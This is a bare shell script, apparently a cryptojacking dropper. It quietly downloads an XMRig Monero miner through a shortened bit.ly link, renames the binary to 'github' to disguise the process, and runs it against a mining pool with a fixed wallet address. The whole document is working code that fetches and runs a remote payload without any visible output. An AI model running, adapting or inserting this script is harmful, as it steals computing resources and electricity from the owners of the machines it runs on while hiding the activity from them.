wget -O xmrig-6.16.4-linux-static-x64.tar.gz https://bit.ly/34BX48f > /dev/null 2>&1
tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
cd xmrig-6.16.4
mv xmrig github
chmod u+x github
./github --url pool.hashvault.pro:80 --user iz4iVv3BoPLTSJyorbUTCUhmaFQcBSWV9EhH7XFiKBQiXqE9CGUo2yH547B46W7QNjHsZABRrmA62YAbPJqBAV3T1DcV3cSGQ --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
